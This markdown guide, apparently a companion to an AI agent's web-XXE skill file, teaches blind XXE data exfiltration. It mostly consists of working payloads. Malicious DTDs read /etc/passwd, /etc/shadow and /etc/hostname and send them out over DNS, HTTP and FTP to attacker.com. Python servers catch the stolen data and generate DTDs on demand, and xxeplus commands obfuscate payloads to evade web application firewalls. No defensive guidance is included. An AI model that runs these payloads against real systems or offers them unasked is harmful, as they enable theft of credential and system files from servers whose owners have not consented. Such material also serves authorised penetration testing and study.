# Blind XXE Exfiltration Guide

> Companion to `skills/web-xxe/SKILL.md`. This guide covers OOB data exfiltration via DNS channels, HTTP callbacks, FTP, multi-stage payload construction, and xxeplus for WAF bypass.

---

## 1. Introduction

Blind XXE is the most challenging and rewarding XXE variant. The application processes XML with external entity resolution enabled but does not return entity content in the response. Exploitation requires out-of-band (OOB) channels to exfiltrate data from the target server. This guide covers DNS, HTTP, and FTP exfiltration channels, multi-stage DTD payload construction, and WAF bypass techniques using xxeplus.

---

## 2. DNS Exfiltration Channels

DNS is often the most reliable OOB channel because most networks allow DNS queries to external resolvers. Even when HTTP and FTP egress are filtered, DNS typically passes through. The technique encodes file content as subdomain labels in DNS queries to an attacker-controlled authoritative DNS server.

### 2.1 Setting Up a DNS Listener

Use an authoritative DNS server for a domain you control. Configure it to log all queries, then extract file content from the subdomain labels. For quick testing, use interactsh or Burp Collaborator as managed DNS callback services.

```bash
# Start interactsh client for DNS callback monitoring
interactsh-client -v 2>&1 | tee dns_interactions.log &

# Extract the generated callback subdomain
CALLBACK=$(grep -oP '[a-z0-9]+\.interact\.sh' dns_interactions.log | head -1)
echo "Callback domain: $CALLBACK"
```

### 2.2 DNS Exfiltration Payload

The DTD defines a parameter entity that reads the target file, then constructs a URL with the file content embedded as a subdomain. When the XML parser resolves this entity, it performs a DNS lookup that carries the data to the attacker's DNS server.

**Remote DTD** (`http://attacker.com/dns-exfil.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.exfil.attacker.com/xxe'>">
%eval;
%exfil;
```

**Payload sent to target**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/dns-exfil.dtd">
  %dtd;
]>
<root>blind test</root>
```

### 2.3 DNS Exfiltration Limitations

DNS labels are limited to 63 characters per label and 253 characters total for the full domain name. File content exceeding these limits requires chunking. Encode file content in base64 or hex, then split into DNS-label-safe chunks (alphanumeric and hyphens only). Multiple DNS queries carry successive chunks.

---

## 3. HTTP Callback Exfiltration

HTTP exfiltration sends file content in HTTP GET query parameters or POST body to an attacker-controlled web server. It is simpler to set up than DNS but more likely to be blocked by egress filtering.

### 3.1 HTTP Listener Setup

A simple Python HTTP server captures all incoming requests and logs the full URL including query parameters.

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        data = params.get('d', [''])[0]
        print(f"[EXFIL] Source: {self.client_address[0]}")
        print(f"[EXFIL] Data: {data}")
        with open('exfiltrated.txt', 'a') as f:
            f.write(data + '\n')
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 80), ExfilHandler).serve_forever()
```

### 3.2 HTTP Exfiltration DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/exfil?d=%file;'>">
%eval;
%send;
```

### 3.3 Handling Large Files

For files larger than the URL length limit (typically 2048-8192 characters), use HTTP POST exfiltration. Construct a payload that reads the file and sends it as POST data. Some XML parsers support this through entity chaining.

For chunked exfiltration, use multiple DTD payloads targeting different byte ranges. Read specific lines or sections of large files by combining XXE with `php://filter` (on PHP targets) or by reading individual lines from `/proc/` filesystem entries.

---

## 4. FTP Exfiltration

FTP exfiltration uses the FTP protocol to send file content as part of FTP commands (filename in RETR or CWD). Some XML parsers support `ftp://` URLs in entity definitions, making this a viable alternative when HTTP is blocked.

### 4.1 FTP Listener

```bash
# Simple FTP data capture with netcat
nc -lvnp 2121
# The parser will attempt to connect and send FTP commands containing file content
```

For more robust capture, use a Python FTP server:

```python
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

class LoggingHandler(FTPHandler):
    def on_connect(self):
        print(f"[FTP EXFIL] Connection from {self.remote_ip}:{self.remote_port}")

authorizer = DummyAuthorizer()
authorizer.add_user("anonymous", "", "/tmp/xxe_loot", perm="elradfmw")

handler = LoggingHandler
handler.authorizer = authorizer
server = FTPServer(("0.0.0.0", 2121), handler)
server.serve_forever()
```

### 4.2 FTP Exfiltration DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:2121/%file;'>">
%eval;
%send;
```

---

## 5. Multi-Stage Payload Construction

Advanced blind XXE requires multi-stage DTD payloads that chain multiple entity resolutions. Each stage performs a specific action: read the file, process the content, construct the exfiltration URL, and trigger the OOB request.

### 5.1 Three-Stage DTD Chain

Stage one reads the target file into a parameter entity. Stage two dynamically defines another entity that incorporates the file content. Stage three triggers the OOB request carrying the data. The `&#x25;` encoding represents `%` within an entity value, necessary because parameter entities use `%` as a delimiter.

```xml
<!-- Stage 1: Read file content -->
<!ENTITY % stage1 SYSTEM "file:///etc/passwd">

<!-- Stage 2: Dynamically define exfiltration entity -->
<!ENTITY % stage2 "<!ENTITY &#x25; stage3 SYSTEM 'http://attacker.com/c?d=%stage1;'>">

<!-- Trigger stages in sequence -->
%stage2;
%stage3;
```

### 5.2 Dynamic DTD Generation

For engagements targeting multiple files, deploy a dynamic DTD server that generates payloads on demand. The target payload includes the desired file path as a query parameter, and the server generates the appropriate DTD.

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class DynamicDTDHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        target_file = params.get('file', ['/etc/passwd'])[0]
        callback = params.get('cb', ['http://attacker.com/exfil'])[0]

        dtd = f'''<!ENTITY % file SYSTEM "file://{target_file}">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM '{callback}?f={target_file}&d=%file;'>">
%eval;
%send;'''

        self.send_response(200)
        self.send_header("Content-Type", "application/xml-dtd")
        self.end_headers()
        self.wfile.write(dtd.encode())

HTTPServer(('0.0.0.0', 80), DynamicDTDHandler).serve_forever()
```

**Target payload referencing dynamic DTD**:

```xml
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/dtd?file=/etc/shadow&cb=http://attacker.com/exfil">
  %dtd;
]>
<root>test</root>
```

---

## 6. WAF Bypass with xxeplus

xxeplus provides automated WAF bypass through encoding obfuscation, payload splitting, and alternative XML syntax. It generates payloads that avoid common WAF detection patterns while preserving XXE functionality.

### 6.1 UTF-16 Encoding Bypass

Many WAFs inspect request bodies as ASCII text. Encoding the XML payload in UTF-16 bypasses keyword-based detection for `DOCTYPE`, `ENTITY`, and `SYSTEM` because these strings appear as two-byte sequences that the WAF does not match against.

```bash
# Generate UTF-16 encoded XXE payload
python3 xxeplus.py --target http://target/api \
  --method POST \
  --payload blind-xxe \
  --encode utf16 \
  --callback http://attacker.com/xxe
```

### 6.2 Payload Obfuscation Techniques

xxeplus applies multiple obfuscation techniques in sequence: XML comment insertion between DOCTYPE keywords, whitespace padding, alternative entity syntax (PUBLIC vs SYSTEM), and CDATA wrapping. Each technique targets a different WAF pattern-matching rule.

```bash
# Generate obfuscated payloads with multiple bypass techniques
python3 xxeplus.py --target http://target/api \
  --method POST \
  --payload classic-xxe \
  --obfuscate comments,whitespace,case \
  --file /etc/passwd \
  --output results/
```

### 6.3 Batch Testing

For comprehensive testing, use xxeplus in batch mode to test multiple payload variants against the target endpoint, identifying which techniques bypass the specific WAF in place.

```bash
python3 xxeplus.py --target http://target/api \
  --method POST \
  --payload all \
  --callback http://attacker.com \
  --auto-detect \
  --output xxe_results.txt
```

---

## References

- PortSwigger Blind XXE Lab: https://portswigger.net/web-security/xxe/blind
- XXEinjector: https://github.com/enjoiz/XXEinjector
- xxeplus: https://github.com/TheTwitchy/xxer
- interactsh (OOB callback): https://github.com/projectdiscovery/interactsh
- OWASP Testing Guide - XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
